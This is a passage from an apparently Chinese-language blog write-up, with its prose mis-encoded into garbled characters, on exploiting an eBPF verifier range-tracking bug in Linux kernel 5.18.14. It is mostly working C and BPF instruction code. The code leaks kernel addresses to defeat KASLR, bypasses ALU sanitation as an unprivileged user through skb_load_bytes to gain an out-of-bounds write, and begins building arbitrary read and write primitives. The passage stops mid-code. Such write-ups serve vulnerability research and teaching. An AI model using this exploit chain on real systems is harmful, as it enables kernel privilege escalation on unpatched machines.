<h3 id="amp-map-0-åå‘çš„æ•°æ®æ³„éœ²"><a href="#amp-map-0-åå‘çš„æ•°æ®æ³„éœ²" class="headerlink" title="&amp;map[0] åå‘çš„æ•°æ®æ³„éœ²"></a>&amp;map[0] åå‘çš„æ•°æ®æ³„éœ²</h3><p>æ‰©å¤§æˆ˜æœï¼Œå°†æ¨æµ‹ä¸º 0ï¼Œå®é™…ä¸º 1 çš„ R1 ç›´æ¥è¿›è¡Œä¸€ä¸ªä¹˜ï¼Œä¾¿å¯ä»¥å®ç°å‘åä»»æ„åç§»çš„è¯»ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">val = <span class="number">1</span>;</span><br><span class="line">map_update(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// R0 =&gt; &amp;map[0]</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_FP, <span class="number">-0x08</span>, <span class="number">0</span>), <span class="comment">// key=0</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-8</span>),</span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), <span class="comment">// map_lookup_elem(mapfd, &amp;k)</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0), 	 <span class="comment">// R9 =&gt; &amp;map[0]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; var_off=(value=0; mask=0xffffffff00000000)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; var_off=(value=0xfffffffe00000001; mask=0)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0xfffffffe</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; (s32_min=1, s32_max=0, u32_min=1, u32_max=0)  real:1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; (s32_min=0, s32_max=1, u32_min=0, u32_max=1)  real:1</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">    BPF_JMP32_IMM(BPF_JLE, BPF_REG_2, <span class="number">1</span>, <span class="number">2</span>), <span class="comment">// REG_2 &lt; 1 ? JMP $+2 : EXIT</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 0	 real:1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),</span><br><span class="line">    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),</span><br><span class="line">    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 0 actual: 0x100</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, <span class="number">0x100</span>),		<span class="comment">// !!!</span></span><br><span class="line"></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_9),</span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_3, BPF_REG_1),	<span class="comment">// reg3 = reg1 + &amp;map[0]</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, <span class="number">0</span>),	<span class="comment">// reg2 = *(u64 *)reg3</span></span><br><span class="line"></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_2, <span class="number">-0x10</span>), <span class="comment">// *(u64 *)(fp-0x10)=reg2</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP), </span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-0x08</span>), <span class="comment">// key</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),    </span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x10</span>), <span class="comment">// value</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG4, <span class="number">0</span>),              <span class="comment">// flags</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_update_elem),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> progfd = bpf(BPF_PROG_LOAD, &amp;prog_attr);</span><br><span class="line"><span class="keyword">if</span> (progfd == <span class="number">-1</span>) fatal(<span class="string">&quot;[-] bpf(BPF_PROG_LOAD)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> socks[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks)) </span><br><span class="line">    fatal(<span class="string">&quot;socketpair&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(<span class="type">int</span>)))</span><br><span class="line">    fatal(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] write.\n&quot;</span>);</span><br><span class="line">write(socks[<span class="number">1</span>], <span class="string">&quot;Hello&quot;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">map_lookup(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val = 0x%016lx\n&quot;</span>, val);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, verifier_log);</span><br><span class="line">getchar();</span><br></pre></td></tr></table></figure>

<p><img src="/img/ebpf-12-10/1-5.png"></p>
<p><img src="/img/ebpf-12-10/1-6.png"></p>
<p>å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šå†…æ ¸ä»£ç æ®µåœ°å€å¯ä»¥ç”¨æ¥ç»•è¿‡ kaslrï¼ˆä½†æ˜¯ç¨³ä¸ç¨³å®šæ²¡æœ‰æµ‹è¯•ï¼‰ã€‚</p>
<p>è¯·æ³¨æ„ï¼Œå½“å¸¸æ•° 0x100 ä½œä¸º MOV ä¼ é€’æ—¶ï¼ŒéªŒè¯å™¨ä¼šæ£€æµ‹åˆ°è¶…èŒƒå›´å¼•ç”¨ï¼Œè¡¨æ˜è¯¥æ¼æ´å¯ä»¥å¯¼è‡´è¶…èŒƒå›´å¼•ç”¨ã€‚ç„¶è€Œï¼Œå¦‚æœåŒä¸€ç¨‹åºä»¥æ™®é€šç”¨æˆ·çš„æƒé™æ‰§è¡Œï¼Œå°±ä¸ä¼šæœ‰æ•°æ®æ³„éœ²ï¼Œå› ä¸ºALU sanitation ä¼šå°†è¶…å‡ºèŒƒå›´çš„å¼•ç”¨é€šè¿‡åŠ æ³•è½¬æ¢ä¸º 0 çš„åŠ æ³•ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ (ä»ä¸€å¼€å§‹å°±æ”¾å…¥çš„å€¼1è¢«å–å‡ºï¼Œè¿™ä¹Ÿè¡¨æ˜ç”±äºALUçš„å«ç”Ÿé—®é¢˜ï¼ŒåŠ æ³•æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼‰ã€‚</p>
<p><img src="/img/ebpf-12-10/1-7.png"></p>
<blockquote>
<p>åœ¨æ²¡æœ‰ALU sanitation çš„å¹´ä»£ï¼Œè¿™ç§æŠ€æœ¯æ˜¯å¯¹è¯»&#x2F;å†™ bpf_map ç»“æ„ ops ç­‰æœ€å¸¸è§çš„æ”»å‡»ã€‚</p>
</blockquote>
<p>åˆ«å¿˜äº†ï¼Œæ­¤æ—¶æˆ‘ä»¬æ˜¯ root æƒé™åœ¨æµ‹è¯•ã€‚</p>
<h2 id="æ™®é€šç”¨æˆ·ç»•è¿‡-ALU-sanitation"><a href="#æ™®é€šç”¨æˆ·ç»•è¿‡-ALU-sanitation" class="headerlink" title="æ™®é€šç”¨æˆ·ç»•è¿‡ ALU sanitation"></a>æ™®é€šç”¨æˆ·ç»•è¿‡ ALU sanitation</h2><p>å¹¸è¿çš„æ˜¯ï¼Œåœ¨æœ¬æ–‡è®¨è®ºçš„å†…æ ¸ v5.18.14 ä¸­ï¼Œæœ‰ä¸€ç§æ–¹æ³•å¯ä»¥ç»•è¿‡ ALU sanitationã€‚ è¿™ä¸ªæ€è·¯æ˜¯è®©ä¸€ä¸ªç°æœ‰çš„è¾…åŠ©å‡½æ•°å·¥ä½œï¼Œå› ä¸ºå¯¹æŒ‡é’ˆçš„åŠ å‡æ³•ï¼ˆè¶…å‡ºèŒƒå›´çš„ï¼‰ä¼šè¢«ä¿®è¡¥ã€‚</p>
<p>æ™®é€šç”¨æˆ·å¯ä»¥ä½¿ç”¨çš„è¾…åŠ©å‡½æ•°å¾ˆå°‘ï¼Œä½†è®©æˆ‘ä»¬çœ‹çœ‹ä»¥åç§»é‡å’Œå¤§å°ä¸ºå‚æ•°çš„å‡½æ•°ã€‚<strong>å‡½æ•° skb_load_bytes å°±å¯ä»¥åœ¨ socket filter ä¸­ä½¿ç”¨</strong>ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">BPF_CALL_4(bpf_skb_load_bytes, <span class="type">const</span> <span class="keyword">struct</span> sk_buff *, skb, u32, offset,</span><br><span class="line">	   <span class="type">void</span> *, to, u32, len)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(offset &gt; INT_MAX))</span><br><span class="line">		<span class="keyword">goto</span> err_clear;</span><br><span class="line"></span><br><span class="line">	ptr = skb_header_pointer(skb, offset, len, to);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!ptr))</span><br><span class="line">		<span class="keyword">goto</span> err_clear;</span><br><span class="line">	<span class="keyword">if</span> (ptr != to)</span><br><span class="line">		<span class="built_in">memcpy</span>(to, ptr, len);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_clear:</span><br><span class="line">	<span class="built_in">memset</span>(to, <span class="number">0</span>, len);</span><br><span class="line">	<span class="keyword">return</span> -EFAULT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_skb_load_bytes_proto</span> =</span> &#123;</span><br><span class="line">	.func		= bpf_skb_load_bytes,</span><br><span class="line">	.gpl_only	= <span class="literal">false</span>,</span><br><span class="line">	.ret_type	= RET_INTEGER,</span><br><span class="line">	.arg1_type	= ARG_PTR_TO_CTX,</span><br><span class="line">	.arg2_type	= ARG_ANYTHING,</span><br><span class="line">	.arg3_type	= ARG_PTR_TO_UNINIT_MEM,</span><br><span class="line">	.arg4_type	= ARG_CONST_SIZE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>è¯¥å‡½æ•°å…è®¸å°†æ•°æ®åŒ…çš„å†…å®¹å¤åˆ¶åˆ° BPF ç«¯ï¼ˆæ˜ å°„æˆ–å †æ ˆï¼‰ã€‚</p>
<p>æŒ‡å®šç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¸Šä¸‹æ–‡ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¦å¤åˆ¶çš„æ•°æ®åŒ…çš„åç§»é‡ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºç›®æ ‡ç¼“å†²åŒºï¼Œç¬¬å››ä¸ªå‚æ•°ä¸ºè¦å¤åˆ¶çš„å¤§å°ã€‚æ‹·è´çš„æºå¤´æ˜¯æ•°æ®åŒ…ï¼Œæ‰€ä»¥é€šè¿‡ write å‘é€è‡³å¥—æ¥å­—çš„æ•°æ®ä¼šè¢«æ‹·è´ã€‚<strong>å½“è¿™ä¸ªå‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œå®ƒä¼šç¡®å®šå‚æ•°æ˜¯å¦è¶…å‡ºäº†èŒƒå›´ï¼Œä½†ä¸å— ALU sanitation çš„å½±å“ã€‚</strong>è®©æˆ‘ä»¬æ¥è¯•ä¸€è¯•ã€‚ ç°åœ¨ï¼ŒBPF æ˜ å°„çš„æ•°æ®å¤§å°æ˜¯8ï¼Œæ‰€ä»¥å¦‚æœä½ èƒ½å¤åˆ¶è¶…è¿‡8ä¸ªå­—èŠ‚ï¼Œä½ å°±æˆåŠŸäº†! </p>
<p>åˆ›å»ºä¸€ä¸ªå¯„å­˜å™¨ï¼Œä½¿éªŒè¯å™¨åˆ¤æ–­å…¶ä¸º1ï¼Œè€Œå®é™…å€¼ä¸º0x10ã€‚ç”¨å†™çš„æ–¹å¼å‘é€è¶…è¿‡0x10å­—èŠ‚çš„æ•°æ®ï¼Œç”¨ gdb æ£€æŸ¥å®ƒæ˜¯å¦è¢«å¤åˆ¶åˆ°æ˜ å°„ä¸Šã€‚ï¼ˆæ³¨æ„ï¼Œå¦‚æœä½ ä¼ é€’0ï¼ˆæˆ–ä¸€ä¸ªå‡å®šå€¼ï¼‰ä½œä¸ºå¤§å°ï¼Œverifier å°†è¢«æé†’ï¼‰</p>
<p>ä¸Šè¿°ç¨‹åºä¼šå°†å¸¦æœ‰ skb_load_bytes çš„æ•°æ®åŒ…å†™å…¥ BPF æ˜ å°„çš„ç¬¬0ä¸ªå…ƒç´ ï¼ˆè¯¥å…ƒç´ å­˜å‚¨åœ¨åœ°å€ R9ï¼Œæ˜¯ç¬¬ä¸€æ¬¡è·å¾—çš„åœ°æ–¹ï¼‰ã€‚å®é™…ä¸Šå†™çš„æ˜¯0x10ä¸ªå­—èŠ‚ï¼Œä½† verifier æ¨æµ‹æ˜¯1ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥å…è®¸å†™ã€‚</p>
<p>è°ƒç”¨ç¨‹åºæ—¶ï¼Œå‘é€0x10å­—èŠ‚çš„æ•°æ®ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// R8 --&gt; context</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),</span><br><span class="line"><span class="comment">// Â·Â·Â·</span></span><br><span class="line"><span class="comment">// R1 --&gt; 1 / actual: 0x10		æ³¨æ„é¡ºåºä¸å¯ä»¥å å…ˆåŠ æˆ1åï¼Œå®é™…å’ŒçœŸå®éƒ½æ˜¯0x10äº†</span></span><br><span class="line">BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, <span class="number">0x10</span><span class="number">-1</span>),</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_ARG2, <span class="number">0</span>),			 <span class="comment">// arg2=offset  (0)</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_9),  <span class="comment">// arg3=to      (&amp;map[0])</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_1),  <span class="comment">// arg4=len     (0x10)</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),  <span class="comment">// arg1=skb</span></span><br><span class="line">BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),</span><br><span class="line"><span class="comment">// ----------------------------------------------------------------</span></span><br><span class="line"><span class="type">char</span> payload[<span class="number">0x10</span>];</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;payload[<span class="number">0</span>] = <span class="number">0x4141414141414141</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;payload[<span class="number">8</span>] = <span class="number">0xdeadbeefcafebabe</span>;</span><br><span class="line">write(socks[<span class="number">1</span>], payload, <span class="number">0x10</span>);</span><br></pre></td></tr></table></figure>

<details class="note "><summary><p>æ­¤æ­¥å®Œæ•´çš„ä»£ç æ®µ</p>
</summary>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> mapfd = map_create(<span class="number">8</span>, <span class="number">1</span>);</span><br><span class="line"><span class="type">char</span> verifier_log[<span class="number">0x10000</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> val;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> map_addr = leak_map_addr(mapfd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] map_addr =&gt; 0x%016lx\n&quot;</span>, map_addr);</span><br><span class="line"></span><br><span class="line">val = <span class="number">1</span>;</span><br><span class="line">map_update(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// R8 --&gt; context</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R0 =&gt; &amp;map[0]</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_FP, <span class="number">-0x08</span>, <span class="number">0</span>), <span class="comment">// key=0</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-8</span>),</span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), <span class="comment">// map_lookup_elem(mapfd, &amp;k)</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; var_off=(value=0; mask=0xffffffff00000000)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; var_off=(value=0xfffffffe00000001; mask=0)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0xfffffffe</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; (s32_min=1, s32_max=0, u32_min=1, u32_max=0)  real:1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; (s32_min=0, s32_max=1, u32_min=0, u32_max=1)  real:1</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">    BPF_JMP32_IMM(BPF_JLE, BPF_REG_2, <span class="number">1</span>, <span class="number">2</span>), <span class="comment">// REG_2 &lt; 1 ? JMP $+2 : EXIT</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 0	 real:1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),</span><br><span class="line">    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),</span><br><span class="line">    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 1 / actual: 0x10</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, <span class="number">0x10</span><span class="number">-1</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG2, <span class="number">0</span>),			 <span class="comment">// arg2=offset  (0)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_9),  <span class="comment">// arg3=to      (&amp;map[0])</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_1),  <span class="comment">// arg4=len     (0x10)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),  <span class="comment">// arg1=skb</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attr</span> =</span> </span><br><span class="line">&#123;</span><br><span class="line">    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">    .insn_cnt = <span class="keyword">sizeof</span>(insns) / <span class="keyword">sizeof</span>(insns[<span class="number">0</span>]),</span><br><span class="line">    .insns = (<span class="type">uint64_t</span>)insns,</span><br><span class="line">    .license = (<span class="type">uint64_t</span>)<span class="string">&quot;GPL v2&quot;</span>,</span><br><span class="line">    .log_level = <span class="number">2</span>,</span><br><span class="line">    .log_size = <span class="keyword">sizeof</span>(verifier_log),</span><br><span class="line">    .log_buf = (<span class="type">uint64_t</span>)verifier_log,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> progfd = bpf(BPF_PROG_LOAD, &amp;prog_attr);</span><br><span class="line"><span class="keyword">if</span> (progfd == <span class="number">-1</span>) fatal(<span class="string">&quot;[-] bpf(BPF_PROG_LOAD)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> socks[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks)) </span><br><span class="line">    fatal(<span class="string">&quot;socketpair&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(<span class="type">int</span>)))</span><br><span class="line">    fatal(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] write.\n&quot;</span>);</span><br><span class="line"><span class="type">char</span> payload[<span class="number">0x10</span>];</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;payload[<span class="number">0</span>] = <span class="number">0x4141414141414141</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;payload[<span class="number">8</span>] = <span class="number">0xdeadbeefcafebabe</span>;</span><br><span class="line">write(socks[<span class="number">1</span>], payload, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">map_lookup(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val = 0x%016lx\n&quot;</span>, val);</span><br></pre></td></tr></table></figure>

</details>

<p>æ‰§è¡Œç»“æœå¦‚å›¾ï¼Œæ˜¾ç„¶è¶…å‡ºäº† 8 å­—èŠ‚ï¼š</p>
<p><img src="/img/ebpf-12-10/1-8.png"></p>
<p><img src="/img/ebpf-12-10/1-9.png"></p>
<p>ç°åœ¨ï¼Œåœ¨å †ä¸Šçš„ oob write å·²ç»å®ç°äº†ï¼Œå‰©ä¸‹çš„å¯ä»¥ç”¨ä»»ä½•ä½ å–œæ¬¢çš„æ–¹å¼æ¥åˆ©ç”¨ã€‚ ä¾‹å¦‚ï¼Œä½ å¯ä»¥æŠŠä¸¤å¼  BPF æ˜ å°„å¹¶æ’æ”¾åœ¨ä¸€èµ·ï¼Œå¹¶è¦†å†™åé¢çš„æ˜ å°„çš„å†…å®¹ã€‚æ¥ä¸‹æ¥å°±åˆ©ç”¨ BPF çš„ç‰¹ç‚¹æ¥å®ç°AAR&#x2F;AAWã€‚</p>
<h2 id="AAR-x2F-AAW"><a href="#AAR-x2F-AAW" class="headerlink" title="AAR&#x2F;AAW"></a>AAR&#x2F;AAW</h2><p>å›é¡¾ä¸€ä¸‹ï¼ŒæŒ‡é’ˆå¯ä»¥è¢«å†™å…¥ BPF æ ˆã€‚å¯¹å­˜å‚¨åœ¨æ ˆä¸­çš„æ•°æ®è¿›è¡Œç±»å‹å’ŒèŒƒå›´è¿½è¸ªã€‚å› æ­¤å¯ä»¥å°è¯•é€šè¿‡skb_load_bytes åœ¨æ ˆä¸Šè¿›è¡Œçš„ oob writeï¼Œè¦†å†™æ ˆä¸Šçš„æŒ‡é’ˆä¸ºæ•°æ®åŒ…ä¸­æ„é€ å¥½çš„æ•°æ®ã€‚åœ¨è¢«è¦†ç›–åï¼Œverifier ä»ç„¶å°†å…¶è¯†åˆ«ä¸ºä¸€ä¸ªæŒ‡é’ˆï¼Œå› æ­¤å¯ä»¥è¯»å†™æˆ‘ä»¬æ„é€ çš„æŒ‡é’ˆã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="/img/ebpf-12-10/1-10.png"></p>
<p>ç”¨ BPF_STX_MEM æ”¾ç½®æŒ‡é’ˆåœ¨ FP-0x18ï¼Œé€šè¿‡ oob write FP-0x20 å°±å¯ä»¥è¦†å†™è¯¥å­—æ®µã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// arbRead</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> </span><br><span class="line">&#123;</span><br><span class="line">    Â·Â·Â·</span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, <span class="number">-0x18</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 1 / actual: 0x10</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, <span class="number">0x10</span><span class="number">-1</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG2, <span class="number">0</span>),			 	  <span class="comment">// arg2=offset  (0)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x20</span>),  <span class="comment">// arg3=to      (FP-0x20)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_1),       <span class="comment">// arg4=len     (0x10)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),       <span class="comment">// arg1=skb</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),</span><br><span class="line"></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_FP, <span class="number">-0x18</span>),</span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_1, <span class="number">-0x10</span>), <span class="comment">// *(u64 *)(fp-0x10)=reg2</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP), </span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-0x08</span>), <span class="comment">// 